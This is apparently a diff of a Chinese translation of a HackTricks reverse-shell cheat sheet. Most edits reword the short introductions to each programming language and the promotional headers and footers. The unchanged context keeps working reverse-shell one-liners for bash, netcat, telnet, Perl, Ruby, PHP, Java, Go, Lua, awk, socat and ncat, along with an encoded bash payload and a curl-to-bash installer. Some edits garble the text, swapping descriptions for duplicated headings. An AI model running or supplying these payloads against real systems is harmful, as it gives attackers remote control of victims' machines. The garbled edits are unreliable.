@@ -8,7 +8,7 @@
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
 * **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
@@ -18,7 +18,7 @@
 
 ## Full TTY
 
-**一旦获得反向shell，请[**阅读此页面以获取完整的TTY**](full-ttys.md)**。**
+**一旦您获得了反向shell**[ **阅读此页面以获取完整的TTY**](full-ttys.md)**。**
 
 ## Bash | sh
 ```bash
@@ -47,10 +47,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Shell解释
 
 1. **`bash -i`**: 此部分命令启动一个交互式 (`-i`) Bash shell。
-2. **`>&`**: 此部分命令是将**标准输出** (`stdout`) 和**标准错误** (`stderr`) **重定向到同一目的地**的简写表示。
-3. **`/dev/tcp/<攻击者IP>/<端口>`**: 这是一个特殊文件，**表示与指定IP地址和端口的TCP连接**。
+2. **`>&`**: 此部分命令是将**标准输出** (`stdout`) 和**标准错误** (`stderr`) **重定向到同一目标**的简写表示。
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 这是一个特殊文件，**表示与指定IP地址和端口的TCP连接**。
 * 通过**将输出和错误流重定向到此文件**，该命令有效地将交互式shell会话的输出发送到攻击者的机器。
-4. **`0>&1`**: 此部分命令**将标准输入 (`stdin`) 重定向到与标准输出 (`stdout`) 相同的目的地**。
+4. **`0>&1`**: 此部分命令**将标准输入 (`stdin`) 重定向到与标准输出 (`stdout`) 相同的目标**。
 
 ### 创建文件并执行
 ```bash
@@ -81,13 +81,13 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-在[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)中查看
+在 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) 进行检查
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet（Telnet）是一种远程登录协议，可通过网络在远程主机上执行命令。
+Telnet（Telecommunication Network）是一种用于远程登录的协议。 Telnet客户端通过Telnet协议连接到Telnet服务器，允许用户在远程计算机上执行操作。 Telnet协议在未加密的情况下传输数据，因此不建议在不安全的网络上使用。
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -118,21 +118,21 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl是一种流行的脚本编程语言，广泛用于系统管理、文本处理和网络编程。Perl脚本通常以.pl为扩展名。Perl脚本可以在Linux系统上运行，并且可以通过命令行解释器直接执行。Perl具有强大的正则表达式功能，使其成为处理文本数据的理想选择。
+Perl是一种通用的脚本语言，广泛用于系统管理、文本处理、网络编程等领域。Perl脚本可以在Linux系统上运行，并且通常被用于编写各种类型的脚本和工具。Perl具有强大的正则表达式支持，使其成为处理文本数据的理想选择。
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby是一种灵活且简单易学的编程语言，广泛用于Web开发。
+## Ruby
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
 
-PHP是一种流行的服务器端脚本语言，通常用于Web开发。
+PHP (Hypertext Preprocessor) 是一种流行的开源服务器端脚本语言，特别适用于 Web 开发。
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -146,7 +146,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ## Java
 
-Java是一种通用编程语言，广泛用于开发各种类型的应用程序。 Java程序可以在各种操作系统上运行，因为它是一种跨平台语言。 Java程序通常在Java虚拟机（JVM）上运行，这使得它们具有良好的可移植性和安全性。 Java也被广泛用于Web开发，企业应用程序和移动应用程序开发。
+Java是一种通用编程语言，广泛用于开发各种类型的应用程序。 Java程序可以在不同的操作系统上运行，只需安装适当的Java运行时环境（JRE）。 Java程序通常编译为字节码，然后在Java虚拟机（JVM）上运行。 Java具有强大的标准库和丰富的生态系统，使其成为流行的选择之一。
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -154,26 +154,20 @@ p.waitFor()
 ```
 ## Ncat
 
-Ncat是一个强大的网络工具，可以用于连接、侦听、传输数据等。
+Ncat is a powerful networking utility that can read and write data across networks using the TCP or UDP protocols. It is designed to be a reliable back-end tool that can be used directly or easily driven by other programs and scripts. Ncat is capable of port scanning, banner grabbing, transferring files, and much more.
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-找到最重要的漏洞，这样你就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
+
+Golang是一种由Google开发的编程语言。
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发。Lua脚本可以通过解释器执行，也可以编译成字节码运行。Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。
+Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过解释器执行，也可以编译成字节码运行。 Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。 Lua脚本可以通过C语言扩展，实现与底层系统的交互。 Lua的灵活性和易学性使其成为许多开发者的首选。
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -182,7 +176,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## NodeJS
 
-NodeJS是一个基于Chrome V8引擎的JavaScript运行环境，可用于服务器端编程。
+## NodeJS
 ```javascript
 (function(){
 var net = require("net"),
@@ -257,7 +251,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-## Awk
+Awk是一种强大的文本分析工具，可以用于处理结构化文本数据。Awk提供了强大的文本处理能力，包括搜索、过滤和转换文本数据。Awk使用一种简洁而灵活的语法，适合用于快速处理和分析文本文件。
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -333,11 +327,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 <summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-支持HackTricks的其他方式:
+支持HackTricks的其他方式：
 
 * 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
 * **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
